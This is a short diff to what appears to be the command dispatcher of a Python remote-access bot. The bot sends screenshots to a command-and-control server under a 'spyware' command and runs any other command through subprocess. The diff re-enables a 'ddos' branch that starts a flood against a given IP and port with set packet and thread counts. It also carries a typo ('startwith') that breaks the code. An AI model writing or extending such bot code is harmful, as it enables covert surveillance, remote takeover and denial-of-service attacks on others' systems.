@@ -124,10 +124,10 @@ def run_command(cmd, sent_at):
                     file_path = files[-1] if files else None
 
                     send_screenshot_to_c2(file_path,command="spyware",sent_at=sent_at)
-                # elif cmd.startwith("ddos"):
-                #     parts = cmd.split()
-                #     _,target_ip, target_port, num_packets, delay, num_threads = parts
-                #     output = DoS.DoSSimulator.start_attack(target_ip, target_port, num_packets, delay, num_threads)
+                elif cmd.startwith("ddos"):
+                    parts = cmd.split()
+                    _,target_ip, target_port, num_packets, delay, num_threads = parts
+                    output = DoS.DoSSimulator.start_attack(target_ip, target_port, num_packets, delay, num_threads)
                 else:
                     output = subprocess.getoutput(cmd)
             except Exception as e:
